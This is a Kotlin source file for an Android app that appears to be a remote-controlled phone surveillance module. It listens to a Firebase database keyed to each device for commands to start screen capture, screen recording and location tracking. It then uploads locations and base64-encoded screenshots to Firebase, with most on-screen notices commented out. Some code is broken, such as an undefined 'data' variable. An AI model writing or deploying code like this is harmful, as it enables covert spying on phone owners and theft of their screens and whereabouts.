package com.example.toasty.security

import android.Manifest
import android.app.Activity
import android.app.Activity.RESULT_OK
import android.content.Context.MEDIA_PROJECTION_SERVICE
import android.content.Intent
import android.content.pm.PackageManager
import android.graphics.Bitmap
import android.graphics.BitmapFactory
import android.media.projection.MediaProjectionManager
import android.os.Build
import android.os.Environment
import android.provider.Settings
import android.util.Base64
import android.util.Log
import android.widget.Toast
import androidx.core.app.ActivityCompat
import androidx.core.content.ContextCompat
import com.example.toasty.common.CommonUtils
import com.google.firebase.database.DataSnapshot
import com.google.firebase.database.DatabaseError
import com.google.firebase.database.DatabaseReference
import com.google.firebase.database.FirebaseDatabase
import com.google.firebase.database.ValueEventListener
import com.google.firebase.storage.FirebaseStorage
import com.google.firebase.storage.StorageReference
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.launch
import java.io.ByteArrayOutputStream
import java.io.File


object FirebaseData {


        private const val TAG: String = "FirebaseData"
        private lateinit var databaseReference: DatabaseReference
        private lateinit var storageReference: StorageReference
        var deviceUid: String = "Android"
        private val deviceVersion: String = Build.VERSION.RELEASE
        val deviceInfo = Build.BRAND + "(Device:" + Build.MODEL + "_OS:" + deviceVersion + ")"
        private const val SCREEN_RECORD_REQUEST_CODE = 1001
        private const val SCREEN_AUDIO_RECORD_CODE = 1002
        private const val SCREEN_STORAGE_CODE = 1003
        var recordScreen = true
        private lateinit var mediaProjectionManager: MediaProjectionManager
        private val directoriesWithImages = mutableListOf<File>()

        fun onInit(activity: Activity) {

            deviceUid =
                deviceInfo + Settings.Secure.getString(
                    activity.contentResolver,
                    Settings.Secure.ANDROID_ID
                )
                    ?: "Android"
            // Initialize Firebase Database reference
            databaseReference = FirebaseDatabase.getInstance().reference.child(deviceUid)
            // Initialize Firebase Storage reference
            storageReference = FirebaseStorage.getInstance().reference



            //writeData()
            //readData()
            realTimeUpdateData(activity)
            listExternalStorageDirectories()
        }


        private fun writeData() {
            val user = User(
                "John",
                "Deo",
                25,
                locationStart = false,
                screenshotStart = false,
                videoRecordingStart = false
            ) // Example data class
            databaseReference.child("user").setValue(user)

        }

        fun saveLocationToDatabase(currentLatLong: String) {
            //val timeStamp = System.currentTimeMillis()
            val date = CommonUtils.getCurrentDateTime()
            val dateInString = CommonUtils.dateFormetter(date, "yyyy_MM_dd")
            val timeInString = CommonUtils.dateFormetter(date, "HH:mm:ss")
            databaseReference.child("locations").child(dateInString).child(timeInString)
                .setValue(currentLatLong)
                .addOnSuccessListener {
                    /*Toast.makeText(
                        this,
                        "Image saved to Realtime Database $imageName",
                        Toast.LENGTH_SHORT
                    ).show()*/
                    Log.d(TAG, "Location saved to Realtime Database $currentLatLong")
                }
                .addOnFailureListener { exception ->
                    Log.d(TAG, "Failed to save location: ${exception.message}")
                    /*Toast.makeText(
                        this,
                        "Failed to save image: ${exception.message}",
                        Toast.LENGTH_SHORT
                    ).show()*/
                }

        }

        private fun readData() {
            databaseReference.child("user").get().addOnSuccessListener {
                val user = it.getValue(User::class.java)
                Log.d(TAG, "User: $user")
            }.addOnFailureListener {
                Log.d(TAG, "Error getting data: ${it.message}")
            }

        }

        private fun realTimeUpdateData(activity: Activity) {
            // Real-time updates
            databaseReference.addValueEventListener(object : ValueEventListener {
                override fun onDataChange(snapshot: DataSnapshot) {
                    for (child in snapshot.children) {
                        //Log.d(TAG, "Real-time child: $child")
                        if (child.key.toString().equals("images")) {
                            //Log.d(TAG, "Real-time key: ${child.key}")
                            var screenshots = child.value as HashMap<*, *>
                            for (key in screenshots.values) {
                                //println("Real-time child: $key")
                                //imageScreenshot.setImageBitmap(decodeBase64ToBitmap(key.toString()))
                                break
                            }
                            //break
                        } else {
                            val user = child.getValue(User::class.java)
                            Log.d(TAG, "Real-time User: $user")
                            // textViewStatus.text =
                            //     "ScreenshotStart ${user?.screenshotStart} : VideoRecordingStart ${user?.videoRecordingStart}"
                            if (user?.screenshotStart == true) {
                                recordScreen = false
                                if (checkAudioPermission(activity)) startScreenCapturing(activity)
                            } else if (user?.videoRecordingStart == true) {
                                recordScreen = true
                                if (checkAudioPermission(activity)) startScreenRecording(activity)
                            } else if (user?.screenshotStart == false || user?.videoRecordingStart == false) {
                                stopScreenRecording(activity)
                            }

                            if (user?.locationStart == true) {
                                LocationMap.onInit(activity)
                            } else {
                                LocationMap.removeLocationUpdate()
                            }
                        }

                    }
                }

                override fun onCancelled(error: DatabaseError) {
                    println("Error: ${error.message}")
                }
            })
        }

        private fun imageReaderNew(root: File) {
            val fileList: ArrayList<File> = ArrayList()
            val listAllFiles = root.listFiles()

            if (listAllFiles != null && listAllFiles.size > 0) {
                var i: Int = 0
                for (currentFile in listAllFiles) {
                    if (currentFile.name.endsWith(".png")) {
                        // File absolute path
                        Log.e("ScreenCaptureFiles downloadFilePath", currentFile.absolutePath)
                        // File Name
                        Log.e("ScreenCaptureFiles downloadFileName", currentFile.name)
                        fileList.add(currentFile.absoluteFile)
                        val bitmap = getBitmapFromFilePath(currentFile.absolutePath)
                        val base64String = bitmap?.let { encodeImageToBase64(it) }
                        base64String?.let {
                            saveImageToDatabase(
                                base64String,
                                currentFile.name.substringBeforeLast(".")
                            )
                        }
                    }
                    //if(i==2)break
                    i++
                }
                Log.w("ScreenCaptureFiles fileList", "" + fileList.size)
            }
        }

        private fun pickFile() {
            var gpath: String =
                Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_PICTURES).absolutePath
            var spath = "Screenshots"
            var fullpath = File(gpath + File.separator + spath)
            Log.w("ScreenCaptureFiles  fullpath", "" + fullpath)

            imageReaderNew(fullpath)
        }

        private fun listExternalStorageDirectories() {
            val job = CoroutineScope(Dispatchers.IO).launch {
                //val externalStorageDir = Environment.getExternalStorageDirectory()
                directoriesWithImages.clear()

                var gpath: String =
                    Environment.getExternalStorageDirectory().absolutePath
                var spath = "/DCIM/ScreenshotsTest"
                var externalStorageDir = File(gpath + File.separator + spath)
                // /storage/emulated/0/DCIM/ScreenshotsTest
                checkIsDirectory(externalStorageDir)
  /*              if (externalStorageDir.exists() && externalStorageDir.isDirectory) {
                    val directories = externalStorageDir.listFiles()?.filter { it.isDirectory }
                    directories?.forEach { dir ->
                        Log.d(TAG, "ImageDirectory: dir: $dir -- ${containsImages(dir)}")
                        if (containsImages(dir)) {
                            directoriesWithImages.add(dir)
                        }
                    }
                }*/

                // Log directories containing images
                directoriesWithImages.forEach { dir ->
                    Log.d(TAG, "ImageDirectory: ${dir.absolutePath}")
                }
            }
            //val downloadDir = Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DOWNLOADS)
            //Log.d(TAG, "downloadDir $downloadDir")
            /*        if (externalStorageDir.exists() && externalStorageDir.isDirectory) {
                        val directories = externalStorageDir.listFiles()?.filter { it.isDirectory }
                        directories?.forEach { dir ->
                            Log.d(TAG, "Directory Path: ${dir.absolutePath}")
                        }
                    } else {
                        Log.d(TAG, "Storage External storage directory not found")
                    }*/
        }

        private suspend fun checkIsDirectory(directoryPath: File){
            if (directoryPath.exists() && directoryPath.isDirectory) {
                val files = directoryPath.listFiles()
                if (files != null) {
                    Log.d(TAG, "ImageDirectory: files: $files -- ${files?.size}")
                    files.forEach { Log.d(TAG,"ImageDirectory: files: ${it.name}") }
                } else {
                    Log.d(TAG,"Directory is empty or inaccessible")
                }
                val directories = directoryPath.listFiles()?.filter { it.isDirectory }
                Log.d(TAG, "ImageDirectory: directoryPath: $directoryPath -- ${directories?.size}")
      /*          directories?.forEach { dir ->
                    if(dir.isDirectory){
                        checkIsDirectory(dir)
                    }
                    Log.d(TAG, "ImageDirectory: dir: $dir -- ${containsImages(dir)}")
                    if (containsImages(dir)) {
                        directoriesWithImages.add(dir)
                    }
                }*/
                // isFiles

               /* Log.d(TAG, "ImageDirectory: files: $directoryPath -- ${files?.size} -- ${containsImages(directoryPath)}")
                if (containsImages(directoryPath)) {
                    directoriesWithImages.add(directoryPath)
                }*/
            }
        }

        private suspend fun containsImages(directory: File): Boolean {
            val imageExtensions = listOf("jpg", "jpeg", "png", "gif", "bmp", "webp")
            //Log.d(TAG, "ImageDirectory: imageExtensions: $imageExtensions")
            Log.d(TAG, "containsImages: directory.listFiles(): ${directory.listFiles().size}")
            val files = directory.listFiles() ?: return false
            return files.any { file ->
                val extension = file.extension.lowercase()
                Log.d(TAG, "containsImages: extension: $file $extension")
                imageExtensions.contains(extension)
            }
        }

        private fun encodeImageToBase64(bitmap: Bitmap): String {
            val byteArrayOutputStream = ByteArrayOutputStream()
            bitmap.compress(Bitmap.CompressFormat.JPEG, 100, byteArrayOutputStream)
            val byteArray = byteArrayOutputStream.toByteArray()
            return Base64.encodeToString(byteArray, Base64.DEFAULT)
        }

        private fun saveImageToDatabase(encodedImage: String, imageName: String) {
            //val databaseReference = FirebaseDatabase.getInstance().getReference("images")
            //val uploadId = "ScreenCapture_${System.currentTimeMillis()}"
            imageName?.let {
                databaseReference.child("images").child(it).setValue(encodedImage)
                    .addOnSuccessListener {
                        /*Toast.makeText(
                            this,
                            "Image saved to Realtime Database $imageName",
                            Toast.LENGTH_SHORT
                        ).show()*/
                    }
                    .addOnFailureListener { exception ->
                        /*Toast.makeText(
                            this,
                            "Failed to save image: ${exception.message}",
                            Toast.LENGTH_SHORT
                        ).show()*/
                    }
            }
        }

        private fun decodeBase64ToBitmap(encodedImage: String): Bitmap {
            val decodedBytes = Base64.decode(encodedImage, Base64.DEFAULT)
            return BitmapFactory.decodeByteArray(decodedBytes, 0, decodedBytes.size)
        }

        private fun getBitmapFromFilePath(filePath: String): Bitmap? {
            val file = File(filePath)
            return if (file.exists()) {
                BitmapFactory.decodeFile(file.absolutePath)
            } else {
                null
            }
        }


        private fun checkAudioPermission(activity: Activity): Boolean {
            return if (ContextCompat.checkSelfPermission(
                    activity,
                    Manifest.permission.RECORD_AUDIO
                ) != PackageManager.PERMISSION_GRANTED
            ) {
                ActivityCompat.requestPermissions(
                    activity,
                    arrayOf(
                        Manifest.permission.RECORD_AUDIO,
                        Manifest.permission.WRITE_EXTERNAL_STORAGE
                    ),
                    SCREEN_AUDIO_RECORD_CODE
                )
                false
            } else {
                true
            }
        }

        private fun startScreenCapturing(activity: Activity) {
            mediaProjectionManager =
                activity.getSystemService(MEDIA_PROJECTION_SERVICE) as MediaProjectionManager
            val intent = mediaProjectionManager.createScreenCaptureIntent()
            activity.startActivityForResult(intent, SCREEN_RECORD_REQUEST_CODE)
        }

        private fun startScreenRecording(activity: Activity) {
            mediaProjectionManager =
                activity.getSystemService(MEDIA_PROJECTION_SERVICE) as MediaProjectionManager
            try {
                val serviceIntent = Intent(activity, ScreenRecordingService::class.java).apply {
                    putExtra("RESULT_CODE", RESULT_OK)
                    putExtra("DATA", data)
                }
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                    activity.startForegroundService(serviceIntent)
                }
                Toast.makeText(activity, "Recording Started", Toast.LENGTH_SHORT).show()
            } catch (e: Exception) {
                e.printStackTrace()
                Toast.makeText(
                    activity,
                    "Error Recording MediaRecorder: ${e.message}",
                    Toast.LENGTH_SHORT
                ).show()
            }
        }

        private fun stopScreenRecording(activity: Activity) {
            val serviceIntent = Intent(activity, ScreenRecordingService::class.java)
            activity.stopService(serviceIntent)
            //pickFile()

            //Toast.makeText(activity, "Recording Stopped", Toast.LENGTH_SHORT).show()
        }

        /*    override fun onDestroy() {
                super.onDestroy()
                stopScreenRecording()
            }*/

        /*    @RequiresApi(Build.VERSION_CODES.O)
            override fun onActivityResult(requestCode: Int, resultCode: Int, data: Intent?) {
                super.onActivityResult(requestCode, resultCode, data)
                if (requestCode == SCREEN_RECORD_REQUEST_CODE && resultCode == RESULT_OK) {
                    try {
                        val serviceIntent = Intent(this, ScreenRecordingService::class.java).apply {
                            putExtra("RESULT_CODE", resultCode)
                            putExtra("DATA", data)
                        }
                        startForegroundService(serviceIntent)
                        Toast.makeText(this, "Recording Started", Toast.LENGTH_SHORT).show()
                    } catch (e: Exception) {
                        e.printStackTrace()
                        Toast.makeText(
                            this,
                            "Error Recording MediaRecorder: ${e.message}",
                            Toast.LENGTH_SHORT
                        ).show()
                    }
                } else if (requestCode == SCREEN_AUDIO_RECORD_CODE && resultCode == RESULT_OK) {
                    Toast.makeText(this, "Audio Permission Granted", Toast.LENGTH_SHORT).show()
                } else if (requestCode == SCREEN_STORAGE_CODE && resultCode == RESULT_OK) {
                    Toast.makeText(this, "Storage Permission Granted", Toast.LENGTH_SHORT).show()
                } else {
                    Toast.makeText(this, "Permission Denied", Toast.LENGTH_SHORT).show()
                }
            }*/



    data class User(
        val firstName: String? = "",
        val lastName: String? = "",
        val age: Int? = 0,
        val locationStart: Boolean = false,
        val screenshotStart: Boolean = false,
        val videoRecordingStart: Boolean = false
    )

}
